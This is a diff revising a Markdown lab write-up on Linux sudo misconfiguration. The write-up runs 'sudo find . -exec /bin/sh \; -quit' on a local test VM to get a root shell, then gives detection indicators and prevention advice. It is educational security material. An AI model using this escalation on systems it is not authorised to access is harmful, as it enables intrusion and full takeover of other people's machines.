@@ -17,7 +17,7 @@
 * [Prerequisites](#prerequisites)
 * [Step 1 — Connecting to the Target and Checking Sudo Permissions](#step-1--connecting-to-the-target-and-checking-sudo-permissions)
 * [Step 2 — Picking a Binary and Checking GTFOBins](#step-2--picking-a-binary-and-checking-gtfobins)
-* [Step 3 — Abusing find with Sudo to Get a Root Shell](#step-3--abusing-find-with-sudo-to-get-a-root-shell)
+* [Step 3 —Using find with sudo to Get a Root Shell](#step-3--using-find-with-sudo-to-get-a-root-shell)
 * [Step 4 — Confirming Full Root Access](#step-4--confirming-full-root-access)
 * [How Defenders Can Catch This](#how-defenders-can-catch-this)
 * [How to Prevent It](#how-to-prevent-it)
@@ -26,26 +26,28 @@
 
 ## Introduction
 
-Sudo Misconfiguration is one of the most common and easiest privilege escalation techniques on Linux. When a normal user is allowed to run certain binaries as root through sudo — especially with NOPASSWD — and that binary has a way to spawn a shell or execute commands, the user can break out into a full root shell with almost no effort.
+Sudo misconfiguration is a common Linux privilege escalation issue. The `sudo` command allows users to run specific commands with root privileges. If these permissions are configured incorrectly, a normal user may be able to run dangerous commands as root.
+
+In this case, the user was allowed to run the `find` binary as root without entering a password. Since `find` can execute commands, it was used to open a root shell and gain full access to the system.
 
 ## Attack Flow
 ```
 Connected to the target over SSH with low privilege credentials
-                        ↓
+                    ↓
 Checked sudo permissions with sudo -l
-                        ↓
+                    ↓
 Found a long list of binaries allowed as root with NOPASSWD
-                        ↓
+                    ↓
 Searched GTFOBins for the find binary
-                        ↓
+                    ↓
 Found the Sudo function escape command for find
-                        ↓
+                    ↓
 Ran sudo find . -exec /bin/sh \; -quit
-                        ↓
+                    ↓
 Got a root shell immediately
-                        ↓
+                    ↓
 Confirmed with whoami and id
-                        ↓
+                    ↓
 Checked sudo -l as root — full (ALL) ALL access confirmed
 ```
 
@@ -60,34 +62,45 @@ If sudo allows a user to run one of these binaries as root, the user can trigger
 |------------------|------------------------------------------|
 | Attacker Machine | Kali Linux                               |
 | Victim Machine   | Debian Linux                             |
-| Victim IP        | 192.168.5.133                            |
+| Victim IP        | `192.168.5.133`                            |
 | Access Method    | SSH with valid low-privilege credentials |
 | Network          | VMware Host-Only Network                 |
 
 ## Tools Used
 
+| Tool | Purpose |
+|------|---------|
+| `SSH` | Used to connect to the target machine |
+| `sudo` | Used to check sudo permissions and run commands as root |
+| `find` | Used to execute a shell through the sudo permission |
+| `GTFOBins` | Used to check the privilege escalation method for `find` |
+
 ## Prerequisites
 
-| What                                     | Why                                            |
-|------------------------------------------|------------------------------------------------|
-| SSH credentials for a low-privilege user | Starting point for the attack                  |
-| `sudo -l` access                         | To see which commands I could run as root      |
-| GTFOBins website                         | To find the shell escape for the allowed binary|
-
+| What | Why |
+|------|-----|
+| SSH credentials for a low-privilege user | Needed to access the target machine |
+| Permission to run `sudo -l` | Needed to check available sudo permissions |
+| Misconfigured sudo rule | Required to perform the privilege escalation |
+| A binary allowed to run as root | Used to get a root shell |
+| Access to GTFOBins | Used to find the correct command for the allowed binary |
 
 ## Step 1 — Connecting to the Target and Checking Sudo Permissions
 
 ### Connected to the Target via SSH
 
+Since the target was running an older SSH setup, I had to add extra flags to allow older key exchange algorithms:
+
 ```bash
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@192.168.5.133
 ```
-**Breakdown**
+**Flag Breakdown**
 
-- `-o HostKeyAlgorithms=+ssh-rsa` : Allows older RSA host key algorithm — needed for older Linux systems
-- `-o PubkeyAcceptedAlgorithms=+ssh-rsa` : Allows older RSA public key algorithm for authentication
-- `192.168.5.133` : Target IP
-- `user`: User Name
+| Flag | Description |
+|------|-------------|
+| `-o HostKeyAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA host key algorithm, which is required by some older Linux systems |
+| `-o PubkeyAcceptedAlgorithms=+ssh-rsa` | Allows the SSH client to use the older RSA public key algorithm for authentication |
+| `user@192.168.5.133` | Connects to the target machine as the `user` account at `192.168.5.133` |
 
 **Output:**
 
@@ -146,21 +159,22 @@ The output showed that I could run several binaries as root without entering a p
 
 ## Step 2 — Picking a Binary and Checking GTFOBins
 
-From the list of binaries I could run as root, I chose find because it is one of the most reliable binaries for getting a root shell.
+From the list of binaries available through sudo, I selected `find` because it can execute commands and has a known shell escape method.
 
 ```bash
 (root) NOPASSWD: /usr/bin/find
 ```
-I then went to GTFOBins and searched for find.
-The find page listed several functions, including Shell, File Write, SUID, and Sudo. Since I was allowed to run find with sudo, I opened the Sudo section to get the command needed to spawn a root shell.
+I checked the `find` entry on GTFOBins to see how it could be used with sudo.
+
+The page showed different methods, including Shell, File Write, SUID, and Sudo. Since `find` was allowed to run with sudo, I used the Sudo method to get a root shell.
 
 <p align="center">
   <img src="images/step2-1.png" width="600">
 </p>
 
-## Step 3 — Abusing find with Sudo to Get a Root Shell
+## Step 3 —Using find with sudo to Get a Root Shell
 
-GTFOBins gave me the exact command for the Sudo function of find
+GTFOBins gave me the exact command for the Sudo function of `find`:
 
 ```bash
 find . -exec /bin/sh \; -quit
@@ -171,50 +185,61 @@ find . -exec /bin/sh \; -quit
 ```bash
 user@debian:~$ sudo find . -exec /bin/sh \; -quit
 ```
-**Breakdown**
+**Flag Breakdown**
 
-- `sudo find` : Runs `find` as **root** through the `sudo` `NOPASSWD` rule.
-- `.` : Searches in the current directory. 
-- `-exec /bin/sh \;` : Executes `/bin/sh` for the first file found. Since `find` is running as **root**, the shell also runs as **root**. 
-- `-quit` : Stops after the first match so `find` does not continue searching.
+| Flag | Description |
+|------|--------------------------------------------|
+| `sudo find` | Runs the `find` command with root privileges |
+| `.` | Searches in the current directory |
+| `-exec /bin/sh \;` | Runs `/bin/sh` when `find` finds a file |
+| `-quit` | Stops `find` after executing the command |
 
 **Output:**
 
 ```
 sh-4.1#
 ```
-The prompt changed from user@debian to sh-4.1# — that # symbol confirms I was now root.
+The prompt changed from `user@debian` to `sh-4.1#`, which shows that the shell was running with root privileges.
 
 ## Step 4 — Confirming Full Root Access
+
+I verified the current user with `whoami`:
 
 ```bash
 sh-4.1# whoami
 ```
+**Output:**
+
 ```
 root
 ```
+I also checked the user ID:
 
 ```bash
 sh-4.1# id
 ```
+**Output:**
+
 ```
 uid=0(root) gid=0(root) groups=0(root)
 ```
+The UID `0` confirms that the current shell is running with root privileges.
+
 <p align="center">
   <img src="images/step4-1.png" width="600">
 </p>
 
-I went from a normal low privilege user straight to a fully unrestricted root account, all from one misconfigured sudo rule on the find binary.
+A normal user account was able to get full root access because of an incorrect sudo rule that allowed the `find` binary to run as root.
 
 ## How Defenders Can Catch This
 
-|                                            Indicator                                   |         What to look for          |
-|----------------------------------------------------------------------------------------|-----------------------------------|
-| `sudo -l` run by a non-admin user                                                      | Audit logs (`/var/log/auth.log`)  |
-| Unexpected root shell spawned from a non-root user session                             | Process monitoring (`auditd`)     |
-| Use of `find`, `vim`, `awk`, or similar tools with sudo right before a UID change to 0 | Command history and session logs  |
-| `sudoers` file containing risky `NOPASSWD` entries                                     | Regular sudoers file audits       |
-
+| Indicator | What to look for |
+|-----------|------------------|
+| Users with unnecessary sudo permissions | Review sudo access regularly |
+| Dangerous binaries allowed through sudo | Check for tools like `find`, `vim`, `awk`, `less`, and `nmap` |
+| `NOPASSWD` entries in sudoers | Review `/etc/sudoers` and `/etc/sudoers.d/` |
+| Root shell started from a normal user account | Monitor process activity and authentication logs |
+| Unexpected sudo usage | Check logs such as `/var/log/auth.log` |
 
 ## How to Prevent It
 
@@ -248,7 +273,6 @@ ls /etc/sudoers.d/
 ```
 
 **Check GTFOBins for every binary granted sudo access**
-
 Before granting sudo rights to any tool, search it on gtfobins.github.io to see if it has a known privilege escalation path.
 
 ## References
@@ -265,10 +289,9 @@ Before granting sudo rights to any tool, search it on gtfobins.github.io to see 
 
 ## Lessons Learned
 
-While working through this attack I realized that:
-
-- Running `sudo -l` should be the very first thing checked on any Linux box.
-- A long list of NOPASSWD binaries is basically a free pass to root if even one of them is on GTFOBins.
-- GTFOBins makes this attack almost effortless — you do not need to remember exploit syntax, just search the binary and copy the command
-- Many admins do not realize how dangerous it is to give sudo access to tools like find, vim, or less.
-- One misconfigured sudo rule was enough to go from a normal user straight to full root with (ALL) ALL permissions.
+- A single incorrect sudo rule can give a normal user full root access.
+- Users should not be allowed to run unnecessary commands as root.
+- Avoid giving sudo access to binaries that can execute other commands.
+- `NOPASSWD` should only be used when it is really needed.
+- Always review sudo permissions and remove unnecessary access.
+- Proper sudo configuration helps prevent Linux privilege escalation.
